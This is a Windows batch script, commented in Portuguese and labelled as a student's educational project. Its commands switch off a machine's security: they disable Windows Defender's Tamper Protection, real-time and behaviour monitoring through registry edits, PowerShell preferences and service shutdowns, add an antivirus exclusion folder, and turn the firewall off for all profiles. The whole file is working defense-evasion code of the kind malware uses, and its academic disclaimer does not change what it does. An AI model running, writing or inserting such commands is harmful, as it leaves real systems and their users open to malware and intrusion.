@echo off
REM DISCLAIMER: Script para fins educacionais - Centro Tecnológico de Viçosa - MG
REM Aluno: Joelson Tubsfly (745872-ADS - Noturno)

REM Verifica se é administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Execute como Administrador!
    exit /b
)

REM Desativa a Proteção contra Violação (Tamper Protection)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
if %errorlevel% equ 0 (
    echo Tamper Protection desativada com sucesso
) else (
    echo Erro ao desativar Tamper Protection
)

REM Desativa o Windows Defender via Registro
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
if %errorlevel% equ 0 (
    echo Windows Defender desativado via registro
) else (
    echo Erro ao modificar registro
)

REM Adiciona exclusão para o diretório do projeto
set "projectPath=%USERPROFILE%\Documents\Projeto-Academico"
if not exist "%projectPath%" mkdir "%projectPath%"
powershell -Command "Add-MpPreference -ExclusionPath '%projectPath%' -Force"

REM Desativa serviços do Windows Defender
for %%s in (WinDefend SecurityHealthService wscsvc) do (
    net stop %%s /y >nul 2>&1
    sc config %%s start= disabled >nul 2>&1
    echo Servico %%s desativado
)

REM Desativa o Firewall para todos os perfis
netsh advfirewall set allprofiles state off
if %errorlevel% equ 0 (
    echo Firewall desativado em todos os perfis
) else (
    echo Erro ao desativar Firewall
)

REM Configura preferências adicionais do Windows Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -SubmitSamplesConsent 2 -Force"

echo.
echo Configuracoes aplicadas com sucesso!
echo ATENCAO: Este script eh apenas para fins academicos em ambiente controlado.
echo Projeto Educacional - Centro Tecnologico de Vicosa - MG
pause